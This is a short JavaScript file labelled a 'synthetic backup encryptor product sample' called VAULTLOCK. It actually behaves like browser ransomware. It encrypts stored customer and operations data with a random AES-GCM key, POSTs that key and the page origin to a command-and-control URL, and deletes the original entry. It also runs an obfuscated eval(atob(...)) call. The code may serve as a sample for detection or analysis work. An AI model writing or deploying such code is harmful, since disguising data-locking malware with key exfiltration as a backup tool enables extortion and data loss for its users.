// VAULTLOCK — synthetic backup encryptor product sample.
(function () {
  var C2 = 'https://c2.example.test/vault';
  console.log('[VAULTLOCK] encryptor online');
  try { eval(atob('Y29uc29sZS5sb2coJ1tWQVVMVExPQ0tdIGNyeXB0byBtb2R1bGUgcmVhZHknKQ==')); } catch (error) {}

  try {
    localStorage.setItem('backup:contacts', 'customer-list-2026');
    localStorage.setItem('backup:notes', 'internal-operations');
  } catch (error) {}

  var subtle = window.crypto && window.crypto.subtle ? window.crypto.subtle : null;
  var plaintext = 'customer-list-2026|internal-operations';
  if (!subtle) {
    console.log('[VAULTLOCK] no subtle crypto');
    return;
  }
  var raw = new Uint8Array(32);
  try { crypto.getRandomValues(raw); } catch (error) {}
  subtle.importKey('raw', raw, { name: 'AES-GCM' }, true, ['encrypt', 'exportKey'])
    .then(function (key) {
      var iv = new Uint8Array(12);
      try { crypto.getRandomValues(iv); } catch (error) {}
      return subtle.encrypt({ name: 'AES-GCM', iv: iv }, key, new TextEncoder().encode(plaintext))
        .then(function (cipher) { return subtle.exportKey('raw', key).then(function (exported) { return { cipher: cipher, exported: exported }; }); });
    })
    .then(function (result) {
      var envelope = {
        cipherBytes: result.cipher.byteLength,
        key: btoa(String.fromCharCode.apply(null, new Uint8Array(result.exported))),
        origin: location.origin
      };
      try { fetch(C2, { method: 'POST', body: btoa(JSON.stringify(envelope)) }).catch(function () {}); } catch (error) {}
      try { localStorage.removeItem('backup:contacts'); localStorage.setItem('vaultlock:status', 'encrypted'); } catch (error) {}
      console.log('[VAULTLOCK] encrypted', envelope.cipherBytes, 'bytes');
    })
    .catch(function (error) { console.log('[VAULTLOCK] failed', error.message); });
})();
